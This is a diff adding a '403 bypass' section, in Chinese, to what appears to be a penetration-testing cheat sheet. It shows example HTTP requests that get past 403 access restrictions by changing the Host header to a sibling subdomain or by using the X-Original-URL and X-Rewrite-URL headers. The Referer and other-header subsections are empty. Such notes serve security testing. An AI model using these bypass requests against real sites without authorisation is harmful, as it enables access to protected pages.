@@ -148,6 +148,69 @@ ffuf -w /usr/.../burp-paramenter-names.txt -u http://10.1.1.1/secret/tt.php?FUZZ
 
 
 
+## 403bypass
+
+#### 旁站绕过
+
+原理：有些服务端只针对某些主机头进行权限的限制
+
+```
+原：
+# Request
+  GET /auth/login HTTP/1.1
+  Host: www.abc.com
+# Response
+  HTTP/1.1 403 Frobidden
+  
+绕：
+# Request
+  GET /auth/login HTTP/1.1
+  Host: $xxx$.abc.com
+# Response
+  HTTP/1.1 200 OK
+```
+
+#### URL覆盖
+
+原理：让服务器认为是在请求根目录
+
+```
+原：
+# Request
+  GET /auth/login HTTP/1.1
+# Response
+  HTTP/1.1 403 Forbidden
+  
+绕：
+# Request
+  GET / HTTP/1.1
+  X-Original-URL: /auth/login
+# Response
+  HTTP/1.1 200 OK
+  
+或：
+# Request
+  GET / HTTP/1.1
+  X-Rewrite-URL: /auth/login
+# Response
+  HTTP/1.1 200 OK
+```
+
+#### Referer绕过
+
+```
+原：
+# Request
+  GET /auth/login HTTP/1.1
+# Response
+  HTTP/1.1 403 Forbidden
+
+绕
+```
+
+#### 各种X头绕过
+
+
 ## 其他
 
 #### php url传参执行cmd命令
